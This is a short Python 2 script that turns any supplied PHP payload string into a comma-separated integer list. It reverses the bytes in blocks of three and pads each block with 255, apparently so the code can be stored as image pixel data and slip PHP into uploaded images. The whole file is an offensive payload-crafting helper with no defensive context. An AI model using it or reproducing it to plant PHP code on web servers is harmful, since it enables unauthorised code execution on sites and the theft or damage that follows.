#!/usr/bin/python

import sys

if len (sys.argv) != 2 :
    print 'Usage: python %s "PHP payload"' % (sys.argv[0])
    sys.exit (1)
else:
    PHPPayload=sys.argv[1]

print " [+] PHP Payload : %s" % (PHPPayload)
intArray=','.join(str(int(p.encode('hex'),16)) for p in PHPPayload).split(',')
print " [+] Integer Array : %s" % (intArray)

j=0
tmpList=[]
finalList=[]
print " [!] Partitioning blocks..."
for i in intArray:
    j+=1
    tmpList.append(i)
    if j==3:
        tmpList=list(reversed(tmpList))
        tmpList.append('255')
        print tmpList
        finalList.extend(tmpList)
        tmpList[:]=[]
        j=0

for i in range(len(tmpList),3):
    tmpList.append('0')
print tmpList
tmpList=list(reversed(tmpList))
tmpList.append('255')
finalList.extend(tmpList)

print ' [+] Final payload : ' + ','.join(str(i) for i in finalList)
